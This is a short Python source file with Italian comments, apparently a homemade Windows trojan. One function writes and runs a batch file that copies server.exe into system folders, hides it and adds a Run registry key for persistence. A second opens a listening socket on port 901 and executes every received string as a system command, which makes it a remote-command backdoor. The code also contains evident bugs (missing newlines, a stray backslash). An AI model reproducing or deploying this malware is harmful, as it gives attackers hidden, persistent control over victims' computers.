#!/usr/bin/python
#brat volk industries all rights reserved
#-------------------------------------------------------------------------------------------------------------
#importiamo le librerie per interfacciarci con il sistema(os) e creare un socket(socket)
import os
import socket

class main:
    def root_of_all_evil():
        #crea un file .bat che fornisce una persistenza al server.exe
        file = open("C:\\nope.bat", "w")
        file.write ("@echo off")
        file.write ("@break off")
        #copiamo server.exe nelle directory di sistema
        file.write ("xcopy C:\\server.exe C:\\Windows")
        file.write ("xcopy C:\\server.exe C:\\Windows\\System32")
        file.write ("xcopy C:\\server.exe C:\\Windows\\System")
        #nascondiamo server.exe
        file.write ("attrib +h C:\\server.exe")
        #aggiungiamo server.exe allo startup nel regedit
        file.write ("REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WINDOWS\\CurrentVersion\\Run\\Dehumanized.trj\",\"C:\Server.exe\"\n")\
        #cancelliamo il file .bat
        file.write ("del /s /q %O")
        #salviamo e apriamo il file
        file.close()
        os.system("start C:\\nope.bat")
    def and_flesh_they_consumed():
        #definiamo un socket in ascolto sul port 901
        socket1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket1.bind((socket.gethostname(), 901))
        socket1.listen(5)
        conn, addr = socket1.accept()
        #creiamo un loop che riceve i dati
        while 1:
             data = conn.recv(893892)
             os.system(data)
             if data == "done":
                 break
    #chiamiamo le varie funzioni
    root_of_all_evil()
    and_flesh_they_consumed()
